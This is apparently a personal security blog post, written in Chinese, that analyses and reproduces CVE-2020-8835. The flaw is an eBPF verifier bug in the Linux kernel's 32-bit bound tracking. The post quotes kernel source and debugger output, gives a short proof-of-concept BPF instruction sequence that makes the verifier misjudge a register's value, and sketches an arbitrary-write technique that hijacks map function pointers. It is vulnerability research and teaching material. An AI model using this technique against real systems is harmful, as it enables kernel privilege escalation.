<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="7r1p13J">





<title>CVE-2020-8835 ebpf漏洞复现与分析 | Hexo</title>



    <link rel="icon" href="/github-11-48.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">7r1pl3J&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/link">Links</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">7r1pl3J&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/link">Links</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">CVE-2020-8835 ebpf漏洞复现与分析</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">7r1p13J</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">November 22, 2022&nbsp;&nbsp;10:28:05</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/kernel/">kernel</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="CVE-2020-8835-ebpf漏洞复现与分析"><a href="#CVE-2020-8835-ebpf漏洞复现与分析" class="headerlink" title="CVE-2020-8835 ebpf漏洞复现与分析"></a>CVE-2020-8835 ebpf漏洞复现与分析</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Linux kernel &gt;&#x3D; v5.4 .7 </p>
<p>于v5.6.1 ,v5.5.14,v5.4.29修复 </p>
<h2 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h2><p>ebpf验证器会对每个寄存器保存其当前状态，用bpf_reg_state来描述</p>
<p>这里引用了@becase 师傅的注释</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ------------------------------------------------</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="comment">/* valid when type == PTR_TO_PACKET */</span></span><br><span class="line">        u16 range;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">         *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">        u32 btf_id; <span class="comment">/* for PTR_TO_BTF_ID */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Max size from any of the above. */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> raw;</span><br><span class="line">    &#125;;</span><br><span class="line">    s32 off;</span><br><span class="line">    u32 id;</span><br><span class="line">    u32 ref_obj_id;</span><br><span class="line">    <span class="comment">/* For scalar types (SCALAR_VALUE), this represents our knowledge of</span></span><br><span class="line"><span class="comment">     * the actual value.</span></span><br><span class="line"><span class="comment">     * For pointer types, this represents the variable part of the offset</span></span><br><span class="line"><span class="comment">     * from the pointed-to object, and is shared with all bpf_reg_states</span></span><br><span class="line"><span class="comment">     * with the same id as us.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var_off</span>;</span>  <span class="comment">// tnum结构体详见以下!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line">    <span class="comment">/* Used to determine if any memory access using this register will</span></span><br><span class="line"><span class="comment">     * result in a bad access.</span></span><br><span class="line"><span class="comment">     * These refer to the same value as var_off, not necessarily the actual</span></span><br><span class="line"><span class="comment">     * contents of the register.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    s64 smin_value; <span class="comment">// 有符号时可能的最小值</span></span><br><span class="line">    s64 smax_value; <span class="comment">// 有符号时可能的最大值</span></span><br><span class="line">    u64 umin_value; <span class="comment">// 无符号时可能的最小值</span></span><br><span class="line">    u64 umax_value; <span class="comment">// 无符号时可能的最大值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">parent</span>;</span></span><br><span class="line">    u32 frameno;</span><br><span class="line">    s32 subreg_def;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_liveness</span> <span class="title">live</span>;</span></span><br><span class="line">    <span class="comment">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don&#x27;t affect safety */</span></span><br><span class="line">    <span class="type">bool</span> precise;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------------------------------------</span></span><br><span class="line"><span class="comment">/* tnum: tracked (or tristate) numbers</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A tnum tracks knowledge about the bits of a value.  Each bit can be either</span></span><br><span class="line"><span class="comment"> * known (0 or 1), or unknown (x).  Arithmetic operations on tnums will</span></span><br><span class="line"><span class="comment"> * propagate the unknown bits such that the tnum result represents all the</span></span><br><span class="line"><span class="comment"> * possible results for possible values of the operands.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> &#123;</span></span><br><span class="line">    u64 value; 		<span class="comment">// value: 某个bit为1 表示这个寄存器的这个bit 确定是1</span></span><br><span class="line">    u64 mask;		<span class="comment">// mask: 某个bit 为1表示这个 bit 是未知的</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>验证器无法得知用户的输入（毕竟我们都还没输入），但是可以通过条件跳转等指令对寄存器大小进行判断，这一前提是所有先前的路径都必须有效（否则程序将无法加载），因此当前路径也必须有效。</p>
<p>比如说，如果已经执行过 <code>BPF_JMP_REG(BPF_JLE,BPF_REG_6,BPF_REG_8,1),</code> ，而reg8的值确定是0x100000001，且当前reg6的umax比这个值大的话，就会更新umax为0x100000001，因为已经执行过并跳转到这里了，reg6的最大值肯定小于0x100000001</p>
<p>当mask为0是，所有位已知，reg为标量。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在我们使用jmp相关命令的时候，会进入 <code>check_cond_jmp_op</code> 函数</p>
<p>在该函数中有这样一段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* detect if we are comparing against a constant value so we can adjust</span></span><br><span class="line"><span class="comment">	 * our min/max values for our dst register.</span></span><br><span class="line"><span class="comment">	 * this is only legit if both are scalars (or pointers to the same</span></span><br><span class="line"><span class="comment">	 * object, I suppose, but we don&#x27;t support that right now), because</span></span><br><span class="line"><span class="comment">	 * otherwise the different base pointers mean the offsets aren&#x27;t</span></span><br><span class="line"><span class="comment">	 * comparable.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">src_reg</span> =</span> &amp;regs[insn-&gt;src_reg];</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> <span class="title">lo_reg0</span> =</span> *dst_reg;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> <span class="title">lo_reg1</span> =</span> *src_reg;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">src_lo</span>, *<span class="title">dst_lo</span>;</span></span><br><span class="line"></span><br><span class="line">		dst_lo = &amp;lo_reg0;</span><br><span class="line">		src_lo = &amp;lo_reg1;</span><br><span class="line">		coerce_reg_to_size(dst_lo, <span class="number">4</span>);</span><br><span class="line">		coerce_reg_to_size(src_lo, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dst_reg-&gt;type == SCALAR_VALUE &amp;&amp;</span><br><span class="line">		    src_reg-&gt;type == SCALAR_VALUE) &#123;</span><br><span class="line">			<span class="keyword">if</span> (tnum_is_const(src_reg-&gt;var_off) ||</span><br><span class="line">			    (is_jmp32 &amp;&amp; tnum_is_const(src_lo-&gt;var_off)))</span><br><span class="line">				reg_set_min_max(&amp;other_branch_regs[insn-&gt;dst_reg],</span><br><span class="line">						dst_reg,</span><br><span class="line">						is_jmp32</span><br><span class="line">						? src_lo-&gt;var_off.value</span><br><span class="line">						: src_reg-&gt;var_off.value,</span><br><span class="line">						opcode, is_jmp32);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (tnum_is_const(dst_reg-&gt;var_off) ||</span><br><span class="line">				 (is_jmp32 &amp;&amp; tnum_is_const(dst_lo-&gt;var_off)))</span><br><span class="line">				reg_set_min_max_inv(&amp;other_branch_regs[insn-&gt;src_reg],</span><br><span class="line">						    src_reg,</span><br><span class="line">						    is_jmp32</span><br><span class="line">						    ? dst_lo-&gt;var_off.value</span><br><span class="line">						    : dst_reg-&gt;var_off.value,</span><br><span class="line">						    opcode, is_jmp32);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (!is_jmp32 &amp;&amp;</span><br><span class="line">				 (opcode == BPF_JEQ || opcode == BPF_JNE))</span><br><span class="line">				<span class="comment">/* Comparing for equality, we can combine knowledge */</span></span><br><span class="line">				reg_combine_min_max(&amp;other_branch_regs[insn-&gt;src_reg],</span><br><span class="line">						    &amp;other_branch_regs[insn-&gt;dst_reg],</span><br><span class="line">						    src_reg, dst_reg, opcode);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>当我们是与标量比较跳转时，会对jmp32进行判断，如果是jmp32 且 reg 寄存器不是常量时，会进入 <code>reg_set_min_max_inv</code> 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">tnum_is_const</span><span class="params">(<span class="keyword">struct</span> tnum a)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> !a.mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mask 全是0 即为常量 </p>
<p>而在  <code>reg_set_min_max_inv</code> 函数内,如果是jmp32指令会进入 <code>__reg_bound_offset32</code> 来设置寄存器32位的边界值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reg_set_min_max_inv</span><span class="params">(<span class="keyword">struct</span> bpf_reg_state *true_reg,</span></span><br><span class="line"><span class="params">				<span class="keyword">struct</span> bpf_reg_state *false_reg, u64 val,</span></span><br><span class="line"><span class="params">				u8 opcode, <span class="type">bool</span> is_jmp32)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_jmp32) &#123;</span><br><span class="line">		__reg_bound_offset32(false_reg); <span class="comment">// jmp 不成立</span></span><br><span class="line">		__reg_bound_offset32(true_reg); <span class="comment">// jmp 成立</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* Intersecting with the old var_off might have improved our bounds</span></span><br><span class="line"><span class="comment">	 * slightly.  e.g. if umax was 0x7f...f and var_off was (0; 0xf...fc),</span></span><br><span class="line"><span class="comment">	 * then new var_off is (0; 0x7f...fc) which improves our umax.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	__update_reg_bounds(false_reg);</span><br><span class="line">	__update_reg_bounds(true_reg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>__reg_bound_offset32</code> 函数如下</p>
<p>计算range，也就是将两个值整合起来生成一个新的tnum var_off </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __reg_bound_offset32(<span class="keyword">struct</span> bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	u64 mask = <span class="number">0xffffFFFF</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">range</span> =</span> tnum_range(reg-&gt;umin_value &amp; mask,</span><br><span class="line">				       reg-&gt;umax_value &amp; mask);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">lo32</span> =</span> tnum_cast(reg-&gt;var_off, <span class="number">4</span>); <span class="comment">//取低32位</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">hi32</span> =</span> tnum_lshift(tnum_rshift(reg-&gt;var_off, <span class="number">32</span>), <span class="number">32</span>);<span class="comment">//取搞32位</span></span><br><span class="line"></span><br><span class="line">	reg-&gt;var_off = tnum_or(hi32, tnum_intersect(lo32, range));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们假设 umax 为 0x100000001, umin 为1，</p>
<p>与mask进行&amp;之哈就直接都为1了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> tnum <span class="title function_">tnum_range</span><span class="params">(u64 min, u64 max)</span></span><br><span class="line">&#123;</span><br><span class="line">	u64 chi = min ^ max, delta;</span><br><span class="line">	u8 bits = fls64(chi);</span><br><span class="line">	<span class="comment">//ind last set bit in a 64-bit word 也就是从第低位起找到第一个被设置成1的位，比如fsl64(4)=3</span></span><br><span class="line">     <span class="comment">//4=0b 100 第三位是1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* special case, needed because 1ULL &lt;&lt; 64 is undefined */</span></span><br><span class="line">	<span class="keyword">if</span> (bits &gt; <span class="number">63</span>)</span><br><span class="line">		<span class="keyword">return</span> tnum_unknown;</span><br><span class="line">	<span class="comment">/* e.g. if chi = 4, bits = 3, delta = (1&lt;&lt;3) - 1 = 7.</span></span><br><span class="line"><span class="comment">	 * if chi = 0, bits = 0, delta = (1&lt;&lt;0) - 1 = 0, so we return</span></span><br><span class="line"><span class="comment">	 *  constant min (since min == max).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	delta = (<span class="number">1ULL</span> &lt;&lt; bits) - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> TNUM(min &amp; ~delta, delta);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时delta&#x3D;0 , min&#x3D;1  也就是说 mask&#x3D;0，value&#x3D;1 是一个恒为1的值，最后通过 tnum_or 合并（简单的或运算），得到确定的位和确定的值</p>
<p>而如果我们是用户输入的寄存器值的话，低32位是可控的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> tnum <span class="title function_">tnum_intersect</span><span class="params">(<span class="keyword">struct</span> tnum a, <span class="keyword">struct</span> tnum b)</span>     </span><br><span class="line">&#123;                                                            </span><br><span class="line">    u64 v, mu;                                               </span><br><span class="line"></span><br><span class="line">    v = a.value | b.value;                                   </span><br><span class="line">    mu = a.mask &amp; b.mask; <span class="comment">//仅有两个tnum都认定为确定的位才是确定的                                   </span></span><br><span class="line">    <span class="keyword">return</span> TNUM(v &amp; ~mu, mu);                                </span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>

<p>我们计算后得到的tnum 会是一个恒为1的值(而非实际值)</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>要设置umin_val和umax_val，我们可以使用验证程序的跳转分支逻辑：</p>
<p>BPF_JMP_IMM(BPF_JGE, BPF_REG_2, 1, 1)</p>
<p>BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)</p>
<p>条件跳转将会产生两个分支。在采用的分支中，验证程序知道BPF_REG_2 &gt;&#x3D; 1，而另一分支将会以退出指令结束而被丢弃。因此，对于所有其他指令，寄存器2的umin_val将为1。</p>
<p>类似地，可以使用另一个条件跳转，将umax_val设置为2^32 + 1。但是，在这里我们需要与寄存器进行比较，因为仅支持32位立即数。之后，我们根据需要设置了umin_val和umax_val。</p>
<p>现在，可以使用任何有条件的32位跳转来触发该漏洞：</p>
<p>BPF_JMP32_IMM(BPF_JNE, BPF_REG_2, 5, 1),</p>
<p>BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0),</p>
<p>验证程序现在认为寄存器2的最后32位是二进制00…01，而实际上它们是二进制00…10。在另外两条指令之后：</p>
<p>BPF_ALU64_IMM(BPF_AND, BPF_REG_2, 2),</p>
<p>BPF_ALU64_IMM(BPF_RSH, BPF_REG_2, 1),</p>
<p>验证程序现在假设寄存器2必须为0，因为如果寄存器2的倒数第二位为0，则AND指令必然会导致结果为0，但实际上它是(2&amp;2)&gt;&gt;1 &#x3D; 1。这是一个非常有用的原语，因为我们现在可以将寄存器2与任何数字相乘，以创建验证程序将任意值视为0。</p>
<p>注意：</p>
<p>一开始我是直接通过mov来给寄存器赋值2的，结果</p>
<p>我们无法直接通过mov将值2加载到寄存器中，因为验证程序随后将知道umin_val&#x3D;umax_val&#x3D;2。但是，有一个简单的解决方法，如果我们从映射加载寄存器（我们可以使用我们的输入映射inmap），验证程序将不会得到关于其值的信息，因为我们可以在运行时更改映射值。</p>
<p>这里做个简单的调试，断点打在__reg_bound_offset32</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221120023746198.png" alt="image-20221120023746198"></p>
<p>我们直接观察函数执行前后reg的变化。</p>
<p>使用映射加载的情况：</p>
<p>false前</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221120024415793.png" alt="image-20221120024415793"></p>
<p>false后</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221120024451456.png" alt="image-20221120024451456"></p>
<p>true前</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221120024601855.png" alt="image-20221120024601855"></p>
<p>true后</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221120024620565.png" alt="image-20221120024620565"></p>
<p>可以看到 value&#x3D;0x1 mask只有第九位是1，所以验证器会认为该寄存器值为1</p>
<p>如果是使用mov reg 2 的话，r6将会是确定的值，就不会再进入reg_set_min_max_inv 函数内了</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221120025420898.png" alt="image-20221120025420898"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>得到一个验证器为0的值，后面就是各种任意读写了，可以参考<a target="_blank" rel="noopener" href="https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html">https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html</a> 的做法，我第一次学习ebpf就是这个做法 ，（印象深刻…</p>
<p>顺便学一下别的做法吧</p>
<p>当我们使用map_update_elem，也会调用map_push_elem，map type需要为BPF_MAP_TYPE_QUEUE或者BPF_MAP_TYPE_STACK</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">static</span> <span class="type">int</span> <span class="title function_">bpf_map_update_value</span><span class="params">(<span class="keyword">struct</span> bpf_map *<span class="built_in">map</span>, <span class="keyword">struct</span> fd f, <span class="type">void</span> *key,  </span></span><br><span class="line"><span class="params">                <span class="type">void</span> *value, __u64 flags)</span>                                     </span><br><span class="line">&#123;                                                                             </span><br><span class="line"><span class="comment">//...                    </span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||     </span><br><span class="line">        ¦  <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;         </span><br><span class="line">        err = <span class="built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="built_in">map</span>, value, flags); </span><br><span class="line"><span class="comment">//..</span></span><br></pre></td></tr></table></figure>

<p>我们将map_push_elem劫持为map_get_next_key</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">array_map_get_next_key</span><span class="params">(<span class="keyword">struct</span> bpf_map *<span class="built_in">map</span>, <span class="type">void</span> *key, <span class="type">void</span> *next_key)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, <span class="keyword">struct</span> bpf_array, <span class="built_in">map</span>);</span><br><span class="line">	u32 index = key ? *(u32 *)key : U32_MAX;</span><br><span class="line">	u32 *next = (u32 *)next_key;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries) &#123;</span><br><span class="line">		*next = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (index == <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries - <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">	*next = index + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>key即我们传的uffd . value，next key即 uffd.flags</p>
<p>next&#x3D;next_key&#x3D;flags</p>
<p>index&#x3D;*(key)&#x3D;value[0]</p>
<p>*next&#x3D;*(flags)&#x3D;index+1&#x3D;value[0]+1</p>
<p>即 *(flags)&#x3D;value[0]+1</p>
<p>这样我们就实现了任意写</p>
